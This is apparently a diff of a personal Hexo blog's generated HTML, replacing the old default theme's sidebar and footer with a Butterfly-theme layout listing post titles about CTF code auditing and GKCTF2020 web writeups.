-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://kee1ong.github.io/2020/08/16/hello-world/" data-id="ckdwx106c0000shfybg4y4ske" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/GKCTF2020/" rel="tag">GKCTF2020</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/GKCTF2020/" style="font-size: 10px;">GKCTF2020</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/08/16/dmsj1/">【代码审计】CTF中的代码审计题目应对策略（一）</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/16/gkctf2/">【GKCTF2020】Web部分Writeup——PartII</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/16/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 Kee1ongZ<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-</body>
-</html>
+More info: Deployment
+</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Kee1ongZ</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives"><div class="headline">文章</div><div class="length_num">3</div></a></div><div class="card-info-data-item is-center">      <a href="/tags"><div class="headline">标签</div><div class="length_num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-recent-item"><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/16/dmsj1/" title="【代码审计】CTF中的代码审计题目应对策略（一）"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【代码审计】CTF中的代码审计题目应对策略（一）"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/16/dmsj1/" title="【代码审计】CTF中的代码审计题目应对策略（一）">【代码审计】CTF中的代码审计题目应对策略（一）</a><time class="aside-post_meta post-meta-date" datetime="2020-08-16T11:24:13.000Z" title="发表于 2020-08-16 19:24:13">2020-08-16</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/16/gkctf2/" title="【GKCTF2020】Web部分Writeup——PartII"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【GKCTF2020】Web部分Writeup——PartII"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/16/gkctf2/" title="【GKCTF2020】Web部分Writeup——PartII">【GKCTF2020】Web部分Writeup——PartII</a><time class="aside-post_meta post-meta-date" datetime="2020-08-16T10:53:35.000Z" title="发表于 2020-08-16 18:53:35">2020-08-16</time></div></div><div class="aside-recent-post"><a class="aside-post-cover" href="/2020/08/16/hello-world/" title="Hello World"><img class="aside-post-bg" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="aside-post-info"><a class="aside-post-title" href="/2020/08/16/hello-world/" title="Hello World">Hello World</a><time class="aside-post_meta post-meta-date" datetime="2020-08-16T09:41:45.164Z" title="发表于 2020-08-16 17:41:45">2020-08-16</time></div></div></div></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/GKCTF2020/" style="font-size: 16px; color: #999">GKCTF2020</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 16px; color: #999">代码审计</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">八月 2020</span><span class="card-archive-list-count">3</span></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="webinfo-article-name">文章数目 :</div><div class="webinfo-article-count">3</div></div><div class="webinfo-item">      <div class="webinfo-site-uv-name">本站访客数 :</div><div class="webinfo-site-uv-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="webinfo-site-name">本站总访问量 :</div><div class="webinfo-site-pv-count" id="busuanzi_value_site_pv"></div></div></div></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Kee1ongZ</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
